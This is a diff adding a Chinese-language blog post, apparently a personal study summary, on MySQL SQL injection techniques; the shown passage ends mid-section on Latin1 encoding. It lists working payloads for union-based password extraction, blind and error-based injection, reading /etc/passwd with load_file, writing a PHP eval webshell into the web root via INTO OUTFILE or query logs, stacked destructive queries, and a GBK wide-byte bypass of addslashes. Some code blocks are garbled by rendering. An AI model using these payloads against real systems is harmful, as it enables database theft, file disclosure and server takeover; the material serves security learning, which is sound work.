@@ -17,4 +17,426 @@
         <category>study notes</category>
       </categories>
   </entry>
+  <entry>
+    <title>SQL注入总结</title>
+    <url>/2020/11/29/sqli/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要总结sql注入相关的知识点。很多地方都写得比较基础，一来便于自己复习，二来需要查阅相关资料的人看到这篇文章理解也会比较方便。为了总结全面一点，文中部分内容直接或间接引用于其他大牛的文章中，我都会标明出处，如有侵权，请发email联系我删除。多有不合理之处，望大佬指点。</p>
+<p>随时更新</p>
+<hr>
+<h2 id="一、MySQL注入原理"><a href="#一、MySQL注入原理" class="headerlink" title="一、MySQL注入原理"></a>一、MySQL注入原理</h2><p>造成原因即，由于一些程序或网站没能全面地过滤、拦截我们输入的数据，我们就可以利用在输入的数据中插入恶意语句，从而欺骗服务器来执行我们插入的sql语句，来获得数据库中的数据或者修改数据库。</p>
+<p>注入的步骤一般是，先通过用一些常见的尝试语句，如<code>&#39;or 1=1--+</code>来寻找注入点或者适合的注入方法，然后再去构造语句对数据库进行增、删、改，读写文件，或者是一步一步从数据库查询到我们想得到的字段数据来达成目的。</p>
+<hr>
+<h2 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a>二、基础知识</h2><blockquote>
+<p><strong>以下内容整理自</strong><a href="http://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/#Basic"><strong>《sql注入备忘录》</strong></a> <strong><a href="https://xz.aliyun.com/t/1298">《sql注入天书》</a></strong></p>
+</blockquote>
+<h3 id="2-1-information-schema数据库"><a href="#2-1-information-schema数据库" class="headerlink" title="2.1 information_schema数据库"></a>2.1 information_schema数据库</h3><p>在Mysql5.0以上的版本中加入了一个information_schema这个系统表，这个系统表中包含了该数据库的所有数据库名、表名、列表，我们可以通过SQL注入来拿到用户的账号和口令。</p>
+<blockquote>
+<p>reference：<a href="https://blog.csdn.net/wwl012345/article/details/97046751">《Mysql中的information_schema数据库》</a></p>
+</blockquote>
+<h3 id="2-2-注释方法"><a href="#2-2-注释方法" class="headerlink" title="2.2 注释方法"></a>2.2 注释方法</h3><ul>
+<li><pre><code class="sql">select * from message ;--where id =1;
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - —+</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;sql</span><br><span class="line">  select * from message ;—+where id &#x3D;1;</span><br></pre></td></tr></table></figure>
+
+- \#</code></pre>
+</li>
+<li><pre><code class="sql">select * from message ;#where id =1;
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - %00</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;sql</span><br><span class="line">  select * from message ;%00where id &#x3D;1;</span><br></pre></td></tr></table></figure>
+
+- /**/</code></pre>
+</li>
+<li><pre><code class="sql">select * from message ;/*where id =1;*/
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 2.3 一般用于尝试的语句 </span><br><span class="line"></span><br><span class="line">or 1&#x3D;1--+ </span><br><span class="line"></span><br><span class="line">&#39;or 1&#x3D;1--+ </span><br><span class="line"></span><br><span class="line">&quot;or 1&#x3D;1--+ </span><br><span class="line"></span><br><span class="line">)or 1&#x3D;1--+ </span><br><span class="line"></span><br><span class="line">&#39;)or 1&#x3D;1--+ </span><br><span class="line"></span><br><span class="line">&quot;) or 1&#x3D;1--+ </span><br><span class="line"></span><br><span class="line">&quot;))or 1&#x3D;1--+</span><br><span class="line"></span><br><span class="line">### 2.4 字符串截取</span><br><span class="line"></span><br><span class="line">- MID(column_name,start[,length]) start起始为1</span><br><span class="line">- LEFT(str,length) length为从左边开始要返回的字符数</span><br><span class="line">- RIGHT(str,length). length为从右边开始要返回的字符数</span><br><span class="line">- SUBSTR(str,pos,len) 从pos开始截取len个,pos起始为1,pos 可以是负值</span><br><span class="line">- SUBSTRING(str,pos,len). 与subsets()相同</span><br><span class="line"></span><br><span class="line">### 2.5 字符串连接函数</span><br><span class="line"></span><br><span class="line">- concat(str1,str2,...)——没有分隔符地连接字符串 </span><br><span class="line"></span><br><span class="line">- concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串 </span><br><span class="line"></span><br><span class="line">- group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</span><br><span class="line"></span><br><span class="line">### 2.6 查看当前数据库版本</span><br><span class="line"></span><br><span class="line">- VERSION()</span><br><span class="line">- @@VERSION</span><br><span class="line">- @@GLOBAL.VERSION</span><br><span class="line"></span><br><span class="line">### 2.7 当前登录用户</span><br><span class="line"></span><br><span class="line">- USER()</span><br><span class="line">- CURRENT_USER()</span><br><span class="line">- SYSTEM_USER()</span><br><span class="line">- SESSION_USER()</span><br><span class="line"></span><br><span class="line">### 2.8 当前使用的数据库</span><br><span class="line"></span><br><span class="line">- DATABASE()</span><br><span class="line">- SCHEMA()</span><br><span class="line"></span><br><span class="line">### 2.9 当前的操作系统</span><br><span class="line"></span><br><span class="line">- @@version_compile_os</span><br><span class="line"></span><br><span class="line">### 2.10 常用语句</span><br><span class="line"></span><br><span class="line">#### 查找所有用户</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;sql</span><br><span class="line">select group_concat(user) from mysql.user;</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata;</span><br></pre></td></tr></table></figure>
+
+<h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;database_name&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出来</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.table_constraints <span class="keyword">where</span> table_schema=<span class="string">&#x27;database_name&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;xxx&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT load_file(&#39;&#x2F;etc&#x2F;passwd&#39;);</span><br></pre></td></tr></table></figure>
+
+<h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">CopySELECT &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile &#x27;/var/www/html/shell.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<hr>
+<h2 id="三、常见类型及绕过方法"><a href="#三、常见类型及绕过方法" class="headerlink" title="三、常见类型及绕过方法"></a>三、常见类型及绕过方法</h2><p>根据不同的分类方法有不同的类型，根据注入点可以简单分为数字形、字符型、搜索型，这里我们按照执行的方法来分类，其中最常见的是联合查询注入、盲注和报错注入，此外还有宽字节注入、堆叠注入、二次注入、正则注入、http头部注入、异或注入等</p>
+<h3 id="3-1-联合查询注入"><a href="#3-1-联合查询注入" class="headerlink" title="3.1 联合查询注入"></a>3.1 联合查询注入</h3><p>即利用union select拼接语句来完成查询。步骤如下：</p>
+<ol>
+<li><p>确定注入点。</p>
+<p>使用一些尝试的语句来找到注入点，确定我们可以插入联合查询语句的位置。</p>
+</li>
+<li><p>确定字段的数量。</p>
+<p>使用<code>order/group by</code>语句，往后边拼接数字来确定字段数量，若大于该数字时页面错误/无内容，小于或等于时页面正常，则字段数量即为该数字。若错误页与正常页一样，联合查询注入可能并不好用，我们就要考虑使用别的方法。</p>
+</li>
+<li><p>判断页面回显数据的字段位置。</p>
+<p>使用<code>union select 1,2,3,4,...</code> 通过显示在页面上的数字，即可判断出页面显示的字段位置，我们就在该位置来查询数据。这里后面的字段数一定要与我们前面字段的数量相同，因为union语句要求前后必须返回相同数量的列，否则语句就无法执行。</p>
+<p>有时当我们确定页面有回显，可页面中并没有我们想看到的数字时，可能是因为页面限制了只输出单行数据，这时我们要把前面的字段都改为<code>NULL</code>来防止对后面造成影响。</p>
+</li>
+<li><p>拼接查询语句查询数据。</p>
+<p>我们来拿sqli-labs的less1举个例子。</p>
+<p>前三步都执行过后，我们来查询数据库。</p>
+<p><code>http://localhost/sqli-labs/Less-1/?id=-1&#39; union select 1,database(),3 --+</code></p>
+<p>得知数据库名字叫做security后我们来查询数据表。</p>
+<p><code>http://localhost/sqli-labs/Less-1/?id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
+<p>然后我们选取其中一个叫users的表来查询它的列。</p>
+<p><code>http://localhost/sqli-labs/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
+<p>我们接着选取其中叫password的列来查询其中的字段值都是什么。</p>
+<p><code>http://localhost/sqli-labs/Less-1/?id=-1&#39; union select 1,group_concat(password),3 from security.users --+</code></p>
+<p>这样我们就成功得到了数据库中用户的密码数据。</p>
+</li>
+</ol>
+<h3 id="3-2-盲注"><a href="#3-2-盲注" class="headerlink" title="3.2 盲注"></a>3.2 盲注</h3><p>当页面并不能直接回显我们想要得到的数据时，我们可以考虑使用盲注。</p>
+<p>盲注的思路就是利用or等逻辑连接词或者if函数来让语句做一个判断，通过观察页面与原本返回的内容/响应时间不同来得出数据内容。</p>
+<p>盲注主要分为时间盲注和布尔盲注。</p>
+<p>我们先利用<code>and1=2</code>,<code>or1=1</code>这两个永真和永假的句子分别做尝试，当页面对这两种情况的响应页面有较明显的区分时，我们可以采用布尔盲注，否则可以考虑时间盲注。</p>
+<p>盲注的好处是适用范围较为广泛，缺点就是耗时长，手工注入工作量会很大，一般要结合工具或者编写脚本来完成自动化注入。</p>
+<h3 id="3-3-布尔盲注"><a href="#3-3-布尔盲注" class="headerlink" title="3.3 布尔盲注"></a>3.3 布尔盲注</h3><p>道理很简单，我们可以使语句中的条件为假（假的嘛，随便找一个肯定不对的就好了，肯定要比找一定为真的要容易些）后面用or来拼接我们要判断的语句，当其为真时整个条件也为真，页面就会返回结果为真的响应，反之则会返回结果为假的反应，通过不断地判断来得知数据库的数据。</p>
+<p>例如通过以下语句来判断数据库长度和其第一位的字符：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=asdhagsuifhafas <span class="keyword">or</span> <span class="keyword">length</span>(<span class="keyword">database</span>())&gt;<span class="number">8</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=asdhagsuifhafas <span class="keyword">or</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="number">130</span></span><br></pre></td></tr></table></figure>
+
+<p>这里我们一般使用二分法来更加快速地得到字符的结果。    </p>
+<h3 id="3-4-时间盲注"><a href="#3-4-时间盲注" class="headerlink" title="3.4 时间盲注"></a>3.4 时间盲注</h3><p>当在真假两种条件时页面返回的信息并不能区分出来的时候，我们就可以利用sleep()函数，通过观察页面响应的时间差异来进行判断，其原理和布尔盲注是一样的，适用范围要更广一些，但更加耗费时间，工作量变得更大了。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=asdhagsuifhafas <span class="keyword">or</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="number">130</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>
+
+<p>如果前面的条件为真的话，这里就会延迟5s，然后再显示页面结果。要注意在手工注入时注意这个时间的把握，太短可能会因为服务器加载出现误差，太长会影响效率。</p>
+<h3 id="3-5-报错注入"><a href="#3-5-报错注入" class="headerlink" title="3.5 报错注入"></a>3.5 报错注入</h3><p>报错注入是一种适用范围也比较广泛的方法，原理是利用一些特殊函数的错误使用来使参数被页面输出出来。可以使用的前提是服务器的报错信息选项要打开。</p>
+<p>常见的利用函数有：<code>exp()、floor()+rand()、updatexml()、extractvalue()</code>，此外还有一些冷门的<code>geometrycollection()、multipoint()</code>等，就不再展开了。</p>
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><blockquote>
+<p>​    <code>ExtractValue(xml_frag, xpath_expr)</code></p>
+<p><code>ExtractValue()</code>接受两个字符串参数，一个XML标记片段 <em>xml_frag</em>和一个XPath表达式 <em>xpath_expr</em>（也称为 定位器）; 它返回<code>CDATA</code>第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p>
+<p>——引自php官方文档</p>
+</blockquote>
+<p>我们可以知道，这里的第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径。而如果我们这里Xpath格式书写错误的话，这里就会报错，并且还会把查询信息放在报错里。这里这样报错的原因比较复杂，也没有查到具体的解释，我们先学会怎么使用就好。</p>
+<p>来个payload示例：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x5c,(<span class="keyword">select</span> <span class="keyword">database</span>(),<span class="number">0x5c</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>因为后面的格式错误，所以我们会查询出数据库的名字，这里加入0x5c（正斜杠）是为了在爆出多条数据时当作分割线来作区分。</p>
+<p>注：<code>ExtractValue()</code>和<code>UpdateXML()</code>都是在MySQL 5.1.5版本中才被加入的，故低于该版本的MySQL是无法使用该方法的。</p>
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><blockquote>
+<p><code>UpdateXML(xml_target, xpath_expr, new_xml)</code></p>
+<p><strong>xml_target:：</strong> 需要操作的xml片段</p>
+<p><strong>xpath_expr：</strong> 需要更新的xml路径(Xpath格式)</p>
+<p><strong>new_xml：</strong> 更新后的内容</p>
+<p>此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 <em>xml_target</em> 新的XML片段 <em>new_xml</em> ，然后返回更改的XML。<em>xml_target</em>替换的部分 与<em>xpath_expr</em> 用户提供的XPath表达式匹配</p>
+<p>——引自php官方文档</p>
+</blockquote>
+<p>和前面同理，只是多了一个参数，我们多加一个就好。</p>
+<p>示例：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x5c</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x5c</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><blockquote>
+<p><code>exp(x)</code></p>
+<p>返回e的不同次方</p>
+<p>x：指数</p>
+<p>——引自菜鸟教程</p>
+</blockquote>
+<p><code>exp()</code>的报错原理是mysql能记录的double数值范围有限，当参数的值过高时，由于指数增长是很快的，得到的值就会超过double的范围，从而报错，如下：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(<span class="number">1000</span>)</span><br><span class="line">&gt; <span class="keyword">DOUBLE</span> <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="keyword">range</span> <span class="keyword">in</span> <span class="string">&#x27;exp(1000)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以我们利用该点，构造payload：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select exp(~(select * from (select users())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((<span class="keyword">select</span> <span class="string">&#x27;root@localhost&#x27;</span> <span class="keyword">from</span> dual)))<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的<del>是sql中的运算符，意为一元字符反转，而0按位取反就会返回“<code>18446744073709551615</code>”，而函数成功执行后就会返回0，所以我们输入`</del>(select database())<code>会返回</code>18446744073709551615`，显然是会超过范围报错的。这里需要嵌套两层子查询，一层不行，原因是什么我还没有搞明白，求大佬指点。</p>
+<p>版本需在MySQL 5.5.5及其以上。</p>
+<h4 id="floor-rand"><a href="#floor-rand" class="headerlink" title="floor()+rand()"></a>floor()+rand()</h4><blockquote>
+<p>rand() 是一个随机函数，通过一个固定的随机数的种子0之后，可以形成固定的伪随机序列。</p>
+<p>floor() 函数的作用就是返回小于等于括号内该值的最大整数，也就是取整。</p>
+<p>group by 主要用来对数据进行分组（相同的分为一组）。</p>
+<p>count(*)用于对数据进行整合计数。</p>
+<p>——内容及下四图引自freebuf<a href="https://www.freebuf.com/column/235496.html">《Mysql报错注入之floor(rand(0)*2)报错原理探究》</a></p>
+</blockquote>
+<p>完整的payload如下：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="number">2</span>,<span class="keyword">concat</span>(<span class="number">0x5c</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x5c</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a</span><br></pre></td></tr></table></figure>
+
+<p>我们把它分割开来理解。</p>
+<p>首先，<code>rand(0)</code>的意思是选择一个固定的随机数种子0，从而形成一个我们可以预见的伪随机序列。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">rand(0)																												0.15522042769493574</span><br><span class="line">		0.620881741513388</span><br><span class="line">		0.6387474552157777</span><br><span class="line">		0.33109208227236947</span><br><span class="line">		0.7392180764481594</span><br><span class="line">		0.7028141661573334</span><br></pre></td></tr></table></figure>
+
+<p>然后，我们用<code>floor()</code>函数取整，<code>floor(rand(0)*2)</code>就是对<code>rand(0)</code>产生的随机序列乘2，再取整，从而得到一个固定的序列，而这个序列刚好是011011这个顺序不断循环。这就是我们选择<code>rand(0)</code>的原因，不会出现一直都是0或1的情况。</p>
+<p>as a就是把前面整个的结果看作是a，方便我们后面用。</p>
+<p>然后我们在后面拼接<code>group by</code>语句。这里作个示例，我们先作一张表，不加<code>group by</code>的结果如下：（as a/x 前面的as省略了）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.1/sqli/sqli_image2.jpg"></p>
+<p>然后我们加上<code>group by x</code>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.1/sqli/sqli_image3.jpg"></p>
+<p>我们可以看到<code>group by</code>会将相同名字的合并，然后按照ascii排序。</p>
+<p>最后我们加上<code>count(*)</code>，如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.1/sqli/sqli_image4.jpg"></p>
+<p>这里的x其实就是每一类的数量。</p>
+<p>那么为什么这个句子会报错呢？</p>
+<p>这里关键的是要理解group by函数的工作过程。<code>group by key</code> 在执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则更新临时表中的数据(更新数据时，不再计算rand值)；如果该key不存在于临时表中，则在临时表中插入key所在行的数据(插入数据时，会再计算rand值)。如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果为1，就会导致插入时冲突而报错。也就是说，检测时和插入时计算了两次随机数的值导致了错误。</p>
+<p>下图非常直观，我们第一次查询0发现不存在，于是插入新的key，此时随机数会重新计算，于是插入了key1，然后第二条查询中有key1，不会再计算，第三条查询时key0没有数据，于是插入新的key，此时重新计算，结果又成了1，于是插入的新数据与第一条数据冲突了，就会报错。这就是我们要用<code>rand(0)</code>的原因，随机数稳定，可以很快就报错。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.1/sqli/sqli_image1.jpg"></p>
+<h3 id="3-6-文件读写"><a href="#3-6-文件读写" class="headerlink" title="3.6 文件读写"></a>3.6 文件读写</h3><p><strong>利用SQL注入可以导入导出文件，获取文件的内容，或者修改文件的内容。</strong></p>
+<blockquote>
+<p>讲Mysql文件读写之前，先要了解什么是file_priv和secure-file-priv</p>
+<p>file_priv是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select file_priv from mysql.user where user&#x3D;$USER host&#x3D;$HOST;</span><br></pre></td></tr></table></figure>
+
+<p>secure-file-priv是一个系统变量，对于文件读/写功能进行限制。具体如下：<br>无内容，表示无限制。</p>
+<ul>
+<li>为NULL，表示禁止文件读/写。</li>
+<li>为目录名，表示仅允许对特定目录的文件进行读/写。</li>
+</ul>
+<p>TIPS：5.5.53本身及之后的版本默认值为NULL，之前的版本无内容。<br>三种方法查看当前secure-file-priv的值：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br><span class="line">select @@global.secure_file_priv;</span><br><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>两个参数的修改：<br>通过修改my.ini文件，添加：secure-file-priv=<br>启动时添加参数：mysqld.exe –secure-file-priv=</p>
+<p>——引自 ttpfx《MySQL注入进阶》</p>
+</blockquote>
+<ul>
+<li><p><strong>读取文件</strong></p>
+<p>读文件通常使用load_file函数，语法如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(file_path);</span><br><span class="line"></span><br><span class="line">SELECT LOAD_FILE(&#39;&#x2F;etc&#x2F;passwd&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<ul>
+<li>LOAD_FILE的默认目录是<code>@@datadir</code></li>
+<li>文件必须是当前用户可读</li>
+<li>需要知道文件的绝对物理路径</li>
+<li>读文件必须小于<code>max_allowed_packet</code>，为1047552byte, 可用<code>SELECT @@max_allowed_packet</code>语句来查看文件读取最大值</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p><strong>向文件写入webshell</strong></p>
+<p>写入后可配合蚁剑等工具操作。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT  &quot;&lt;?php eval($_POST[&#39;a&#39;])?&gt;&quot; INTO OUTFILE &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;;</span><br><span class="line">SELECT  &quot;&lt;?php eval($_POST[&#39;a&#39;])?&gt;&quot; into DUMPFILE &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;NTO OUTFILE函数写文件时会在每一行的结束自动加上换行符 </span><br><span class="line">&#x2F;&#x2F;INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择 </span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<ul>
+<li>需要知道网站的绝对物理路径，这样导出后的webshell才可访问</li>
+<li>对需导出的目录要有可写权限。</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p><strong>日志法</strong></p>
+<p>由于mysql在5.5.53版本之后，<code>secure-file-priv</code>的值默认为<code>NULL</code>，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。</p>
+<p>mysql日志文件的一些相关权限可以直接通过命令来修改：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;请求日志</span><br><span class="line">mysql&gt; set global general_log_file &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;</span><br><span class="line">mysql&gt; set global general_log &#x3D; on;</span><br><span class="line">&#x2F;&#x2F;慢查询日志</span><br><span class="line">mysql&gt; set global slow_query_log_file&#x3D;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;2.php&#39;</span><br><span class="line">mysql&gt; set global slow_query_log&#x3D;1;</span><br><span class="line">&#x2F;&#x2F;还有其他很多日志都可以进行利用</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>之后我们在让数据库执行满足记录条件的恶意语句即可。</p>
+<p>注意：</p>
+<ul>
+<li>权限够，可以进行日志的设置操作</li>
+<li>知道目标目录的绝对路径</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-7-堆叠注入"><a href="#3-7-堆叠注入" class="headerlink" title="3.7 堆叠注入"></a>3.7 堆叠注入</h3><p>顾名思义，就是将多个语句“堆”在一起执行。</p>
+<p>当我们使用联合注入查询的时候，我们不仅必须要返回相同的字段数，还被限制只能执行select一类的语句。而堆叠注入中，因为分号<code>;</code>是MySQL语句的结束符，我们就可以利用分号来在后面执行其它增、删、改等恶意语句。攻击方法很直接，可其局限性也很明显，因为并不是每一个环境下都可以执行，可能受到数据库引擎不支持等的限制，或者直接权限不足。谁又会让你随便删改他的数据库呢？</p>
+<p>一些常见的增删查改payload：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">like</span> <span class="keyword">users</span>;   </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">test</span>;                </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="string">&#x27;100&#x27;</span>,<span class="string">&#x27;new&#x27;</span>,<span class="string">&#x27;new&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">&#x27;c:/tmpupbbn.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-8-宽字节注入"><a href="#3-8-宽字节注入" class="headerlink" title="3.8 宽字节注入"></a>3.8 宽字节注入</h3><p>该方法的原理是，MySQL在使用 GBK 编码的时候，会把两个字符当作 一个汉字，例如<code>%aa%5c</code> 就是一个汉字(前一个 ascii 码大于 128 才能到汉字的范围)。而在过滤 ’ 的时候，往往利用的思路是将 <code>&#39;</code> 转换为 <code>\&#39;</code> ，例如常见的<code>addslashes()</code>函数。 因此我们可以用这个办法将 <code>&#39;</code> 前面添加的 <code>\</code> 除掉，从而成功绕过。</p>
+<p>一般我们有两种思路： </p>
+<p>1、<code>%df</code> 吃掉 <code>\</code> </p>
+<p> urlencode(\‘) = %5c%27，我们在%5c%27 前面添加%df，形 </p>
+<p>成%df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此 </p>
+<p>事%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，脱离了反斜杠，从而达到我们的目的。 </p>
+<p>2、将 <code>\&#39;</code> 中的 <code>\ </code>过滤掉，例如可以构造 <code>%**%5c%5c%27</code> 的情况，后面的%5c 会被前面的%5c </p>
+<p>给注释掉。</p>
+<p>payload示例:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1%df%27union%20select%201,user(),3<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>这里我们添加了一个%df,源码中的<code>addslashes()</code>函数生成的前面的<code>%5c</code>就被它吃掉了，<code>&#39;</code> 即可绕过。</p>
+<h3 id="3-9-Latin1编码相关"><a href="#3-9-Latin1编码相关" class="headerlink" title="3.9 Latin1编码相关"></a>3.9 Latin1编码相关</h3><p>也不算一个方法吧，算一个小技巧，不过因为与宽字节注入相似，就放在一起吧。</p>
+<p>如当我们要登录admin这个用户名，而代码中出现了类似下面的限制时：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们就可以利用Latin1编码来做文章。</p>
